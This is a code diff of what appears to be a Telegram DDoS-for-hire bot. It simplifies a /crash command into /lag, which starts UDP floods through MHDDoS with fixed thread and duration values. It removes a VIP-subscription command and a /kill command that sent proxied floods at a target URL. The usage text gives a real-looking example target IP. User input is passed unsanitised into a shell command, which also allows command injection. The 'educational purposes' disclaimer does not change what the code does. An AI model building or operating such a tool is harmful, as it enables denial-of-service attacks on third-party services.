@@ -28,9 +28,7 @@ def handle_start_command(message):
             f"✅ *YOUR STATUS:* {'VIP' if days_left > 0 else 'REGULAR USER'}\n"
             f"⏳ *DAYS REMAINING:* {days_left if days_left > 0 else 'N/A'}\n\n"
             f"📌 *HOW TO LAUNCH AN ATTACK:*\n"
-            f"/CRASH <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
-            f"💡 EXAMPLE:\n"
-            f"/CRASH UDP 143.92.125.230:10013 10 900\n\n"
+            f"/lag <IP:PORT>\n\n"
             f"⚠️ *NOTE:* THIS BOT IS FOR EDUCATIONAL PURPOSES ONLY"
         )
 
@@ -42,29 +40,8 @@ def handle_start_command(message):
     except Exception as e:
         bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
-@bot.message_handler(commands=['addvip'])
-def handle_addvip_command(message):
-    try:
-        user_id = message.from_user.id
-        if user_id not in ALLOWED_USERS:
-            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
-            return
-
-        command_parts = message.text.split()
-        if len(command_parts) != 3:
-            bot.reply_to(message, "⚠️ CORRECT USAGE: /ADDVIP <USER_ID> <DAYS>")
-            return
-
-        target_user_id = int(command_parts[1])
-        days = int(command_parts[2])
-
-        vip_users[target_user_id] = days
-        bot.reply_to(message, f"✅ ADDED {days} DAY(S) FOR USER {target_user_id}.")
-    except Exception as e:
-        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
-
-@bot.message_handler(commands=['crash'])
-def handle_crash_command(message):
+@bot.message_handler(commands=['lag'])
+def handle_lag_command(message):
     try:
         user_id = message.from_user.id
 
@@ -73,27 +50,26 @@ def handle_crash_command(message):
             return
 
         command_parts = message.text.split()
-        if len(command_parts) < 5:
-            bot.reply_to(
-                message,
-                "⚠️ CORRECT USAGE:\n/CRASH <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\nEXAMPLE:\n/CRASH UDP 143.92.125.230:10013 10 900",
-                parse_mode="Markdown"
-            )
+        if len(command_parts) != 2:
+            bot.reply_to(message, "⚠️ CORRECT USAGE: /lag <IP:PORT>", parse_mode="Markdown")
             return
 
-        attack_type = command_parts[1]
-        ip_port = command_parts[2]
-        threads = command_parts[3]
-        duration = command_parts[4]
+        ip_port = command_parts[1]
 
+        # التأكد من أن المدخل يحتوي على IP:PORT
         if ":" not in ip_port:
-            bot.reply_to(message, "INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
+            bot.reply_to(message, "❌ INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
             return
 
         ip, port = ip_port.split(":")
+        
         if not ip or not port.isdigit():
-            bot.reply_to(message, "INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
+            bot.reply_to(message, "❌ INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
             return
+
+        attack_type = "UDP"  # نوع الهجوم الافتراضي
+        threads = "100"  # عدد الـ Threads الافتراضي
+        duration = "900"  # مدة الهجوم الافتراضية بالمللي ثانية
 
         command = f'python3 start.py {attack_type} {ip}:{port} {threads} {duration}'
         process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
@@ -142,34 +118,6 @@ def stop_attack(call):
     except Exception as e:
         bot.answer_callback_query(call.id, f"AN ERROR OCCURRED: {str(e)}")
         bot.send_message(call.message.chat.id, f"AN ERROR OCCURRED: {str(e)}")
-
-@bot.message_handler(commands=['kill'])
-def handle_kill_command(message):
-    try:
-        user_id = message.from_user.id
-        if user_id not in ALLOWED_USERS:
-            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
-            return
-
-        command_parts = message.text.split()
-        if len(command_parts) != 2:
-            bot.reply_to(message, "⚠️ CORRECT USAGE: /KILL <TARGET_URL>")
-            return
-
-        target_url = command_parts[1]
-
-        # Ensure the URL is valid (basic validation for the format)
-        if not target_url.startswith("https://"):
-            bot.reply_to(message, "⚠️ INVALID URL. MUST START WITH 'https://'")
-            return
-
-        # Prepare and execute the command
-        kill_command = f"python3 /workspaces/MHDDoS/start.py KILLER {target_url} 4 100 https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt 1000 99999 --debug"
-        process = subprocess.Popen(kill_command, shell=True, preexec_fn=os.setsid)
-
-        bot.reply_to(message, f"✅ KILL COMMAND EXECUTED SUCCESSFULLY ON {target_url}")
-    except Exception as e:
-        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
 print("BOT IS RUNNING...")
 bot.polling()
